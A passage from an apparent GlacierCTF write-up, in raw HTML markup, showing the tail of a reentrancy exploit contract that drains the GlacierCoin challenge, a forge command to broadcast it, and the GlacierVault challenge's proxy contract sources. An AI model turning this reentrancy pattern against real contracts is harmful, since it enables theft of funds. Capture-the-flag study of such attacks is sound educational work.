&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; For attack contract usage
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;buy{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span&gt;ether}()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sell&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fallback&lt;&#x2F;span&gt;&lt;span&gt;() external payable { 
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sell&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;    
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Run the following command to solve the challenge.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;forge&lt;&#x2F;span&gt;&lt;span&gt; script script&#x2F;GlacierCoinAttack.s.sol:AttackScript&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;RPC-URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;REDACTED&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;glaciervault-316pts&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#glaciervault-316pts&quot; aria-label=&quot;Anchor link for: glaciervault-316pts&quot;&gt;GlacierVault [316pts]&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;Description :
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;Ascending the glacier under the guidance of your seasoned expedition leader, you encounter a breathtaking sight: a vault intricately carved into the ice, its entrance guarded by a formidable sentinel. This ancient guardian stands watch, an imposing figure resolute in its duty. To gain access to the enigmatic vault and its concealed treasures, you must devise a clever strategy to lull the guardian into a deep, peaceful slumber, a challenge that awaits your resourcefulness and cunning. To get the ticket, run solve-pow.py&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;author: J4X
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc chall.glacierctf.com 13377
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [GlacierVault.sol, Guardian.sol, Setup.sol]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;Setup.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;GlacierVault.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;Guardian.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Setup {
&lt;&#x2F;span&gt;&lt;span&gt;    Guardian public immutable TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Contract the player will hack
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() payable {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Deploy the victim contract
&lt;&#x2F;span&gt;&lt;span&gt;        GlacierVault vault &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;GlacierVault&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Deploy the guardian contract
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Guardian&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(vault))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Our challenge in the CTF framework will call this function to
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; check whether the player has solved the challenge or not.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isSolved&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;asleep&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;Guardian.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Guardian
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    bool public asleep&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address public implementation_addr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 people_mauled&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;putToSleepCall&lt;&#x2F;span&gt;&lt;span&gt;(address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;address)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address _implementation_addr)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        asleep &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        implementation_addr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_implementation_addr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        people_mauled &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;putToSleep&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        emit &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;putToSleepCall&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;owner)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You can&amp;#39;t do that. The yeti mauls you.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        asleep &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;punch&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external payable
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10_000_000 &lt;&#x2F;span&gt;&lt;span&gt;ether)
&lt;&#x2F;span&gt;&lt;span&gt;        {
&lt;&#x2F;span&gt;&lt;span&gt;            asleep &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else
&lt;&#x2F;span&gt;&lt;span&gt;        {
&lt;&#x2F;span&gt;&lt;span&gt;            people_mauled &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_delegate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address implementation&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Copy msg.data. We take full control of memory in this inline assembly
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; block because it will not return to Solidity code. We overwrite the
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Solidity scratch pad at memory position 0.
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calldatacopy&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calldatasize&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Call the implementation.
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; out and outsize are 0 because we don&amp;#39;t know the size yet.
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;gas&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;implementation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;calldatasize&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Copy the returned data.
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;returndatacopy&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;returndatasize&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;switch &lt;&#x2F;span&gt;&lt;span&gt;result
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; delegatecall returns 0 on error.
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;revert&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;returndatasize&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;default &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;returndatasize&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     * &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fa6e32;&quot;&gt;@dev&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt; This is a virtual function that should be overridden so it returns the address to which the fallback function
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     * and {_fallback} should delegate.
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_implementation&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;implementation_addr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     * &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fa6e32;&quot;&gt;@dev&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt; Delegates the current call to the address returned by `_implementation()`.
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     *
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     * This function does not return to its internal call site, it will return directly to the external caller.
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;     *&#x2F;
